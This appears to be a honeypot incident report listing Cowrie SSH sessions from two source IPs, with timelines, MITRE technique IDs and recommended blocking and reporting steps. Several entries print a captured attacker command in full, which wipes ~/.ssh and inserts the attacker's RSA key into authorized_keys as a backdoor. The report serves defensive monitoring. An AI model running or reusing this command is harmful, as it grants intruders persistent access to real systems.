| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-09 04:31:13` | `cowrie.session.connect` |
| `2026-06-09 04:31:13` | `cowrie.client.version` |
| `2026-06-09 04:31:13` | `cowrie.client.kex` |
| `2026-06-09 04:31:14` | `cowrie.login.success` |
| `2026-06-09 04:31:14` | `cowrie.session.params` |
| `2026-06-09 04:31:14` | `cowrie.command.input` |
| `2026-06-09 04:31:14` | `cowrie.command.failed` |
| `2026-06-09 04:31:14` | `cowrie.log.closed` |
| `2026-06-09 04:31:14` | `cowrie.session.params` |
| `2026-06-09 04:31:14` | `cowrie.command.input` |
| `2026-06-09 04:31:15` | `cowrie.session.file_download` |
| `2026-06-09 04:31:15` | `cowrie.log.closed` |
| `2026-06-09 04:31:17` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `173.249.52[.]138` to AbuseIPDB if not already reported
- [ ] Block `173.249.52[.]138` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-ef9d05287078

| Field | Detail |
|---|---|
| **Source IP** | `173.249.52[.]138` |
| **First Seen** | 2026-06-09 04:31 |
| **Last Seen** | 2026-06-09 04:31 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-09 04:31:17` | `cowrie.session.connect` |
| `2026-06-09 04:31:17` | `cowrie.client.version` |
| `2026-06-09 04:31:17` | `cowrie.client.kex` |
| `2026-06-09 04:31:17` | `cowrie.login.success` |
| `2026-06-09 04:31:17` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `173.249.52[.]138` to AbuseIPDB if not already reported
- [ ] Block `173.249.52[.]138` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-d7ea9c7bc6ed

| Field | Detail |
|---|---|
| **Source IP** | `182.18.139[.]237` |
| **First Seen** | 2026-06-09 04:31 |
| **Last Seen** | 2026-06-09 04:31 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-09 04:31:54` | `cowrie.session.connect` |
| `2026-06-09 04:31:54` | `cowrie.client.version` |
| `2026-06-09 04:31:54` | `cowrie.client.kex` |
| `2026-06-09 04:31:55` | `cowrie.login.success` |
| `2026-06-09 04:31:55` | `cowrie.session.params` |
| `2026-06-09 04:31:55` | `cowrie.command.input` |
| `2026-06-09 04:31:55` | `cowrie.command.failed` |
| `2026-06-09 04:31:55` | `cowrie.log.closed` |
| `2026-06-09 04:31:55` | `cowrie.session.params` |
| `2026-06-09 04:31:55` | `cowrie.command.input` |
| `2026-06-09 04:31:55` | `cowrie.session.file_download` |
| `2026-06-09 04:31:55` | `cowrie.log.closed` |
| `2026-06-09 04:31:56` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `182.18.139[.]237` to AbuseIPDB if not already reported
- [ ] Block `182.18.139[.]237` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-587aeb7f770a

| Field | Detail |
|---|---|
| **Source IP** | `182.18.139[.]237` |
| **First Seen** | 2026-06-09 04:31 |
| **Last Seen** | 2026-06-09 04:31 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-09 04:31:56` | `cowrie.session.connect` |
| `2026-06-09 04:31:56` | `cowrie.client.version` |
| `2026-06-09 04:31:56` | `cowrie.client.kex` |
| `2026-06-09 04:31:56` | `cowrie.login.success` |
| `2026-06-09 04:31:56` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `182.18.139[.]237` to AbuseIPDB if not already reported
- [ ] Block `182.18.139[.]237` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-c124fbf26a46

| Field | Detail |
|---|---|
| **Source IP** | `182.18.139[.]237` |
| **First Seen** | 2026-06-09 04:35 |
| **Last Seen** | 2026-06-09 04:35 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-09 04:35:32` | `cowrie.session.connect` |
| `2026-06-09 04:35:32` | `cowrie.client.version` |
| `2026-06-09 04:35:32` | `cowrie.client.kex` |
| `2026-06-09 04:35:32` | `cowrie.login.success` |
| `2026-06-09 04:35:32` | `cowrie.session.params` |
| `2026-06-09 04:35:32` | `cowrie.command.input` |
| `2026-06-09 04:35:32` | `cowrie.command.failed` |
| `2026-06-09 04:35:32` | `cowrie.log.closed` |
| `2026-06-09 04:35:32` | `cowrie.session.params` |
| `2026-06-09 04:35:32` | `cowrie.command.input` |
| `2026-06-09 04:35:32` | `cowrie.session.file_download` |
| `2026-06-09 04:35:32` | `cowrie.log.closed` |
| `2026-06-09 04:35:34` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `182.18.139[.]237` to AbuseIPDB if not already reported
- [ ] Block `182.18.139[.]237` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-5857f97b192e

| Field | Detail |
|---|---|
| **Source IP** | `182.18.139[.]237` |
| **First Seen** | 2026-06-09 04:35 |
| **Last Seen** | 2026-06-09 04:35 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-09 04:35:33` | `cowrie.session.connect` |
| `2026-06-09 04:35:33` | `cowrie.client.version` |
| `2026-06-09 04:35:33` | `cowrie.client.kex` |
| `2026-06-09 04:35:34` | `cowrie.login.success` |
| `2026-06-09 04:35:34` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `182.18.139[.]237` to AbuseIPDB if not already reported
- [ ] Block `182.18.139[.]237` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-e57a9191fc6e

| Field | Detail |
|---|---|
| **Source IP** | `182.18.139[.]237` |
| **First Seen** | 2026-06-09 04:37 |
| **Last Seen** | 2026-06-09 04:37 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-09 04:37:24` | `cowrie.session.connect` |
| `2026-06-09 04:37:24` | `cowrie.client.version` |
| `2026-06-09 04:37:24` | `cowrie.client.kex` |
| `2026-06-09 04:37:24` | `cowrie.login.success` |
| `2026-06-09 04:37:24` | `cowrie.session.params` |
| `2026-06-09 04:37:24` | `cowrie.command.input` |
| `2026-06-09 04:37:24` | `cowrie.command.failed` |
| `2026-06-09 04:37:24` | `cowrie.log.closed` |
| `2026-06-09 04:37:24` | `cowrie.session.params` |
| `2026-06-09 04:37:24` | `cowrie.command.input` |
| `2026-06-09 04:37:24` | `cowrie.session.file_download` |
| `2026-06-09 04:37:24` | `cowrie.log.closed` |
| `2026-06-09 04:37:25` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `182.18.139[.]237` to AbuseIPDB if not already reported
- [ ] Block `182.18.139[.]237` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-827ed658f3f9

| Field | Detail |
|---|---|
| **Source IP** | `182.18.139[.]237` |
| **First Seen** | 2026-06-09 04:37 |
| **Last Seen** | 2026-06-09 04:37 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-09 04:37:25` | `cowrie.session.connect` |
| `2026-06-09 04:37:25` | `cowrie.client.version` |
| `2026-06-09 04:37:25` | `cowrie.client.kex` |
| `2026-06-09 04:37:25` | `cowrie.login.success` |
| `2026-06-09 04:37:25` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `182.18.139[.]237` to AbuseIPDB if not already reported
- [ ] Block `182.18.139[.]237` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-39bf75e5d78c

| Field | Detail |
|---|---|
| **Source IP** | `173.249.52[.]138` |
| **First Seen** | 2026-06-09 04:39 |
| **Last Seen** | 2026-06-09 04:39 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-09 04:39:18` | `cowrie.session.connect` |
| `2026-06-09 04:39:18` | `cowrie.client.version` |
| `2026-06-09 04:39:18` | `cowrie.client.kex` |
| `2026-06-09 04:39:18` | `cowrie.login.success` |
| `2026-06-09 04:39:19` | `cowrie.session.params` |
| `2026-06-09 04:39:19` | `cowrie.command.input` |
| `2026-06-09 04:39:19` | `cowrie.command.failed` |
| `2026-06-09 04:39:19` | `cowrie.log.closed` |
| `2026-06-09 04:39:19` | `cowrie.session.params` |
| `2026-06-09 04:39:19` | `cowrie.command.input` |
| `2026-06-09 04:39:19` | `cowrie.session.file_download` |
| `2026-06-09 04:39:19` | `cowrie.log.closed` |
| `2026-06-09 04:39:22` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `173.249.52[.]138` to AbuseIPDB if not already reported
- [ ] Block `173.249.52[.]138` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-8281303627bd

| Field | Detail |
|---|---|
| **Source IP** | `173.249.52[.]138` |
| **First Seen** | 2026-06-09 04:39 |
| **Last Seen** | 2026-06-09 04:39 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-09 04:39:21` | `cowrie.session.connect` |
| `2026-06-09 04:39:21` | `cowrie.client.version` |
| `2026-06-09 04:39:21` | `cowrie.client.kex` |
| `2026-06-09 04:39:22` | `cowrie.login.success` |
| `2026-06-09 04:39:22` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `173.249.52[.]138` to AbuseIPDB if not already reported
- [ ] Block `173.249.52[.]138` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-77d0be438432

| Field | Detail |
|---|---|
| **Source IP** | `182.18.139[.]237` |
| **First Seen** | 2026-06-09 04:46 |
| **Last Seen** | 2026-06-09 04:46 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-09 04:46:42` | `cowrie.session.connect` |
| `2026-06-09 04:46:42` | `cowrie.client.version` |
| `2026-06-09 04:46:42` | `cowrie.client.kex` |
| `2026-06-09 04:46:42` | `cowrie.login.success` |
| `2026-06-09 04:46:42` | `cowrie.session.params` |
| `2026-06-09 04:46:42` | `cowrie.command.input` |
| `2026-06-09 04:46:42` | `cowrie.command.failed` |
| `2026-06-09 04:46:42` | `cowrie.log.closed` |
| `2026-06-09 04:46:43` | `cowrie.session.params` |
| `2026-06-09 04:46:43` | `cowrie.command.input` |
| `2026-06-09 04:46:43` | `cowrie.session.file_download` |
| `2026-06-09 04:46:43` | `cowrie.log.closed` |
| `2026-06-09 04:46:44` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `182.18.139[.]237` to AbuseIPDB if not already reported
- [ ] Block `182.18.139[.]237` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-6dcf3559349b

| Field | Detail |
|---|---|
| **Source IP** | `182.18.139[.]237` |
| **First Seen** | 2026-06-09 04:46 |
| **Last Seen** | 2026-06-09 04:46 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-09 04:46:44` | `cowrie.session.connect` |
| `2026-06-09 04:46:44` | `cowrie.client.version` |
| `2026-06-09 04:46:44` | `cowrie.client.kex` |
| `2026-06-09 04:46:44` | `cowrie.login.success` |
| `2026-06-09 04:46:44` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `182.18.139[.]237` to AbuseIPDB if not already reported
- [ ] Block `182.18.139[.]237` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-8c3886ea27bb

| Field | Detail |
|---|---|
| **Source IP** | `173.249.52[.]138` |
| **First Seen** | 2026-06-09 04:47 |
| **Last Seen** | 2026-06-09 04:47 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-09 04:47:13` | `cowrie.session.connect` |
| `2026-06-09 04:47:13` | `cowrie.client.version` |
| `2026-06-09 04:47:13` | `cowrie.client.kex` |
| `2026-06-09 04:47:13` | `cowrie.login.success` |
| `2026-06-09 04:47:14` | `cowrie.session.params` |
| `2026-06-09 04:47:14` | `cowrie.command.input` |
| `2026-06-09 04:47:14` | `cowrie.command.failed` |
| `2026-06-09 04:47:14` | `cowrie.log.closed` |
| `2026-06-09 04:47:14` | `cowrie.session.params` |
| `2026-06-09 04:47:14` | `cowrie.command.input` |
| `2026-06-09 04:47:14` | `cowrie.session.file_download` |
| `2026-06-09 04:47:14` | `cowrie.log.closed` |
| `2026-06-09 04:47:17` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `173.249.52[.]138` to AbuseIPDB if not already reported
- [ ] Block `173.249.52[.]138` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-94918f1b831b

| Field | Detail |
|---|---|
| **Source IP** | `173.249.52[.]138` |
| **First Seen** | 2026-06-09 04:47 |
| **Last Seen** | 2026-06-09 04:47 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-09 04:47:16` | `cowrie.session.connect` |
| `2026-06-09 04:47:16` | `cowrie.client.version` |
| `2026-06-09 04:47:16` | `cowrie.client.kex` |
| `2026-06-09 04:47:17` | `cowrie.login.success` |
| `2026-06-09 04:47:17` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `173.249.52[.]138` to AbuseIPDB if not already reported
- [ ] Block `173.249.52[.]138` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-723f2f75997f

| Field | Detail |
|---|---|
| **Source IP** | `182.18.139[.]237` |
| **First Seen** | 2026-06-09 04:48 |
| **Last Seen** | 2026-06-09 04:48 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-09 04:48:36` | `cowrie.session.connect` |
| `2026-06-09 04:48:36` | `cowrie.client.version` |
| `2026-06-09 04:48:36` | `cowrie.client.kex` |
| `2026-06-09 04:48:36` | `cowrie.login.success` |
| `2026-06-09 04:48:36` | `cowrie.session.params` |
| `2026-06-09 04:48:36` | `cowrie.command.input` |
| `2026-06-09 04:48:36` | `cowrie.command.failed` |
| `2026-06-09 04:48:36` | `cowrie.log.closed` |
| `2026-06-09 04:48:36` | `cowrie.session.params` |
| `2026-06-09 04:48:36` | `cowrie.command.input` |
| `2026-06-09 04:48:36` | `cowrie.session.file_download` |
| `2026-06-09 04:48:36` | `cowrie.log.closed` |
| `2026-06-09 04:48:37` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `182.18.139[.]237` to AbuseIPDB if not already reported
- [ ] Block `182.18.139[.]237` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-7b8305aaab7e

| Field | Detail |
|---|---|
| **Source IP** | `182.18.139[.]237` |
| **First Seen** | 2026-06-09 04:48 |
| **Last Seen** | 2026-06-09 04:48 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-09 04:48:37` | `cowrie.session.connect` |
| `2026-06-09 04:48:37` | `cowrie.client.version` |
| `2026-06-09 04:48:37` | `cowrie.client.kex` |
| `2026-06-09 04:48:37` | `cowrie.login.success` |
| `2026-06-09 04:48:37` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `182.18.139[.]237` to AbuseIPDB if not already reported
- [ ] Block `182.18.139[.]237` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-5f0f8ae012df

| Field | Detail |
|---|---|
| **Source IP** | `182.18.139[.]237` |
| **First Seen** | 2026-06-09 04:52 |
| **Last Seen** | 2026-06-09 04:52 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-09 04:52:22` | `cowrie.session.connect` |
| `2026-06-09 04:52:22` | `cowrie.client.version` |
| `2026-06-09 04:52:22` | `cowrie.client.kex` |
| `2026-06-09 04:52:22` | `cowrie.login.success` |
| `2026-06-09 04:52:22` | `cowrie.session.params` |
| `2026-06-09 04:52:22` | `cowrie.command.input` |
